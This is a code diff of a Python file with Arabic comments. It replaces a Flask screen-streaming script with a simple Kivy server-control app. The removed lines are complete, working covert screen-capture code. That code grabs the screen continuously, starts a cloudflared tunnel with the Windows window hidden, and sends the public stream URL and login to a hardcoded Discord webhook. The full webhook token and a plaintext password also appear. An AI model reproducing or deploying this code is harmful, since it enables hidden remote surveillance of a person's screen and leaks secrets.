@@ -1,243 +1,132 @@
-import json
-import os
-import re
-import subprocess
+import socket
 import threading
-import time
-import urllib.request
-import sys
-import io
-from flask import Flask, Response, request
-from PIL import Image, ImageGrab
+from flask import Flask
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.button import Button
+from kivy.uix.label import Label
 
-# ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
-WEBHOOK_URL = "https://discord.com/api/webhooks/1551205294405582928/DI-CIWvAr1dYSICa5I0Gf6pmn0hTtUksrLaWtL5XXSyrYCOwBOmy8V0mazn_fDVVJ-bp"
-
-# ===== 2. بيانات الأمان =====
-USERNAME = "IMNOTSNEAKER"
-PASSWORD = "3mko@3omar"
-
-app = Flask(__name__)
+# ===== 1. إعداد سيرفر Flask =====
+server_app = Flask(__name__)
+is_server_running = False
 
 
-def check_auth(username, password):
-    return username == USERNAME and password == PASSWORD
-
-
-def authenticate():
-    return Response(
-        'Login Required',
-        401,
-        {'WWW-Authenticate': 'Basic realm="Login Required"'},
-    )
-
-
-def generate_frames():
-    # استخدام Pillow بدل OpenCV لالتقاط الشاشة وتحويل الإطارات إلى JPEG
-    while True:
-        try:
-            # التقاط الشاشة
-            img = ImageGrab.grab()
-            img = img.resize((720, 1280))  # أبعاد الشاشة بالطول
-
-            # تحويل الصورة إلى JPEG في الذاكرة
-            buf = io.BytesIO()
-            img.save(buf, format='JPEG', quality=65)
-            frame_bytes = buf.getvalue()
-
-            yield (
-                b'--frame\r\n'
-                b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n'
-            )
-            time.sleep(0.04)  # ضبط معدل الإطارات ~25 FPS وتقليل استهلاك المعالج
-        except Exception:
-            time.sleep(0.1)
-
-
-@app.route('/')
-def index():
-    auth = request.authorization
-    if not auth or not check_auth(auth.username, auth.password):
-        return authenticate()
-
-    # تم تعديل واجهة المستخدم هنا لإضافة Downloading والنقط المتحركة
+@server_app.route('/')
+def home():
     return '''
     <!DOCTYPE html>
-    <html lang="ar">
+    <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>Mobile Screen Share</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>لوحة التحكم</title>
         <style>
             body { 
-                margin: 0; 
-                background: #000; 
-                display: flex; 
-                justify-content: center; 
-                align-items: center; 
-                height: 100vh; 
-                overflow: hidden; 
-                color: #00ff00; /* لون النص أخضر ساطع */
-                font-family: 'Courier New', Courier, monospace; /* خط يشبه شاشات الاختراق/التحميل */
+                background-color: #121212; 
+                color: #ffffff; 
+                font-family: Arial, sans-serif; 
+                text-align: center; 
+                padding: 40px; 
             }
-            
-            /* إعدادات نص التحميل والنقط */
-            #loading-screen {
-                position: absolute;
-                font-size: 24px;
-                font-weight: bold;
-                display: flex;
-                align-items: center;
-                z-index: 1;
+            .card { 
+                background: #1e1e1e; 
+                padding: 25px; 
+                border-radius: 12px; 
+                display: inline-block; 
+                box-shadow: 0 4px 10px rgba(0,0,0,0.5);
             }
-
-            /* حركة النقط */
-            .dots::after {
-                content: '';
-                animation: blink 1.5s steps(4, end) infinite;
-            }
-
-            @keyframes blink {
-                0%, 20% { content: ''; }
-                40% { content: '.'; }
-                60% { content: '..'; }
-                80%, 100% { content: '...'; }
-            }
-
-            /* إعدادات الصورة (مخفية في البداية حتى تحمل) */
-            img { 
-                height: 100%; 
-                object-fit: contain; 
-                z-index: 2;
-                position: relative;
-                display: none; /* إخفاء الصورة في البداية */
-            }
+            h1 { color: #00e676; }
+            p { font-size: 18px; color: #ccc; }
         </style>
     </head>
     <body>
-        <!-- شاشة التحميل -->
-        <div id="loading-screen">Downloading<span class="dots"></span></div>
-        
-        <!-- الصورة: إذا نجح التحميل يتم إخفاء شاشة التحميل وإظهار الصورة -->
-        <img src="/video_feed" 
-             onload="document.getElementById('loading-screen').style.display='none'; this.style.display='block';" 
-             onerror="document.getElementById('loading-screen').style.display='flex'; this.style.display='none';" />
+        <div class="card">
+            <h1>تم الاتصال بنجاح!</h1>
+            <p>سيرفر Flask يعمل على الهاتف وجاهز لاستقبال البيانات.</p>
+        </div>
     </body>
     </html>
     '''
 
 
-@app.route('/video_feed')
-def video_feed():
-    auth = request.authorization
-    if not auth or not check_auth(auth.username, auth.password):
-        return authenticate()
-    return Response(
-        generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame'
-    )
-
-
-def send_to_discord(public_url):
-    if not WEBHOOK_URL or "discord" not in WEBHOOK_URL:
-        return
-
-    payload = {
-        "embeds": [
-            {
-                "title": "📱 تم تشغيل بث شاشة الموبايل بنجاح!",
-                "color": 5814783,
-                "fields": [
-                    {
-                        "name": "🔗 رابط البث المباشر",
-                        "value": (
-                            f"[اضغط هنا لفتح البث]({public_url})\n`{public_url}`"
-                        ),
-                    },
-                    {
-                        "name": "👤 اسم المستخدم",
-                        "value": f"`{USERNAME}`",
-                        "inline": True,
-                    },
-                    {
-                        "name": "🔑 كلمة السر",
-                        "value": f"`{PASSWORD}`",
-                        "inline": True,
-                    },
-                ],
-                "footer": {
-                    "text": "Mobile Screen Share • يعمل في الخلفية"
-                },
-            }
-        ]
-    }
-
+def run_flask():
+    """تشغيل سيرفر Flask على البورت 8080"""
     try:
-        data = json.dumps(payload).encode('utf-8')
-        req = urllib.request.Request(
-            WEBHOOK_URL,
-            data=data,
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
+        server_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
+    except Exception as e:
+        print(f"خطأ في السيرفر: {e}")
+
+
+def get_local_ip():
+    """معرفة الـ IP المحلي للهاتف"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return '127.0.0.1'
+
+
+# ===== 2. إعداد واجهة Kivy =====
+class ServerControlApp(App):
+
+    def build(self):
+        self.title = "Server Controller"
+
+        # التصميم الرئيسي (راسي)
+        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
+
+        # عنوان الواجهة
+        self.title_label = Label(
+            text="تطبيق التحكم بالسيرفر",
+            font_size='22sp',
+            bold=True,
+            size_hint=(1, 0.2),
         )
-        urllib.request.urlopen(req)
-    except Exception:
-        pass
+        layout.add_widget(self.title_label)
+
+        # نص حالة السيرفر
+        self.status_label = Label(
+            text="الحالة: متوقف\nالرابط: ---",
+            font_size='16sp',
+            halign='center',
+            size_hint=(1, 0.4),
+        )
+        layout.add_widget(self.status_label)
+
+        # زر التحكم
+        self.toggle_btn = Button(
+            text="تشغيل السيرفر",
+            font_size='18sp',
+            bold=True,
+            background_color=(0, 0.7, 0.3, 1),
+            size_hint=(1, 0.2),
+        )
+        self.toggle_btn.bind(on_press=self.toggle_server)
+        layout.add_widget(self.toggle_btn)
+
+        return layout
+
+    def toggle_server(self, instance):
+        global is_server_running
+
+        if not is_server_running:
+            # بدء السيرفر في Thread منفصل
+            is_server_running = True
+            threading.Thread(target=run_flask, daemon=True).start()
+
+            ip = get_local_ip()
+            self.status_label.text = (
+                f"الحالة: يعمل الآن\nالرابط المحلي: http://{ip}:8080"
+            )
+            self.toggle_btn.text = "السيرفر قيد التشغيل"
+            self.toggle_btn.background_color = (0.2, 0.6, 1, 1)
+            self.toggle_btn.disabled = True  # تعطيل الزر لمنع التكرار
+        else:
+            pass
 
 
-def start_tunnel(port):
-    time.sleep(1)
-    temp_dir = os.environ.get("TEMP", os.getcwd())
-    
-    # تحديد ملف cloudflared المناسب لنظام التشغيل (Windows أو Linux/Android)
-    is_windows = sys.platform == "win32"
-    cf_filename = "cloudflared.exe" if is_windows else "cloudflared"
-    cf_exe = os.path.join(temp_dir, cf_filename)
-
-    if not os.path.exists(cf_exe):
-        try:
-            if is_windows:
-                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
-            else:
-                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-            
-            urllib.request.urlretrieve(url, cf_exe)
-            if not is_windows:
-                os.chmod(cf_exe, 0o755)  # إعطاء صلاحيات التشغيل على نظام الأندرويد/لينكس
-        except Exception:
-            return
-
-    try:
-        cmd = [cf_exe, "tunnel", "--url", f"http://localhost:{port}"]
-        
-        kwargs = {
-            "stdout": subprocess.PIPE,
-            "stderr": subprocess.STDOUT,
-            "encoding": "utf-8",
-            "errors": "ignore",
-            "bufsize": 1,
-        }
-        if is_windows:
-            kwargs["creationflags"] = 0x08000000  # خيار الخفاء للندوز فقط
-
-        proc = subprocess.Popen(cmd, **kwargs)
-
-        for line in iter(proc.stdout.readline, ""):
-            if "trycloudflare.com" in line:
-                match = re.search(
-                    r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line
-                )
-                if match:
-                    send_to_discord(match.group(0))
-                    break
-    except Exception:
-        pass
-
-
-if __name__ == "__main__":
-    PORT = 8080
-    threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()
-
-    # تشغيل سيرفر Flask
-    app.run(host='0.0.0.0', port=PORT, threaded=True)
+if __name__ == '__main__':
+    ServerControlApp().run()
